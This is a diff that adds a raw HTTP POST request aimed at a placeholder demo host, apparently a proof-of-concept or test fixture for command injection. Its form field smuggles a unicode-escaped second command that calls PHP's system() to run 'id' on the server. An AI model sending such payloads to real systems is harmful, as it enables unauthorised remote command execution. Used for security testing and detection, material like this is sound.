@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Connection: close
+
+id=\u003B php -r \u0022system(\u0027id\u0027)\u003B\u0022
